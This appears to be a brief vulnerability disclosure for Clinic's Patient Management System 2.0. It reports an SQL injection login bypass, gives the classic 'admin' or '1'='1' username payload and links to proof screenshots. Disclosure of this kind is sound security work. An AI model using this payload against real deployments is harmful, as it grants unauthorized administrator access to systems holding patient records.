#### Title: Clinic's Patient Management System 2.0 SQLi
#### Author: Ashish Kumar (https://www.linkedin.com/in/ashish-kumar-0b65a3184)
#### Date: 04.07.2022
#### Vendor: https://www.sourcecodester.com/users/tips23
#### Software: https://www.sourcecodester.com/php-clinics-patient-management-system-source-code
#### Version: 2.0
#### Reference: https://github.com/CyberThoth/CVE/blob/main/CVE/Clinic's%20Patient%20Management%20System/SQLi/POC.md

#### Description:
### It was discovered that SQL Injection techniques can be used to fool the application into authenticating without the needing valid credentials. SQL Injection vulnerabilities on login pages expose an application to unauthorized access at the administrator level, thereby severely compromising the security of the application.

# Status: CRITICAL

### [+] Payloads:

``` 
Username: = admin' or '1'='1
Password: = Cyberthoth;)

```


## Proof and Exploit:
1
![image](https://github.com/CyberThoth/CVE/blob/5198ef2d56f9c818654bbe131c7f7e3055923f23/CVE/Clinic's%20Patient%20Management%20System/SQLi/1.png)

2
![image](https://github.com/CyberThoth/CVE/blob/5198ef2d56f9c818654bbe131c7f7e3055923f23/CVE/Clinic's%20Patient%20Management%20System/SQLi/2.png)

3
![image](https://github.com/CyberThoth/CVE/blob/5198ef2d56f9c818654bbe131c7f7e3055923f23/CVE/Clinic's%20Patient%20Management%20System/SQLi/3.png)

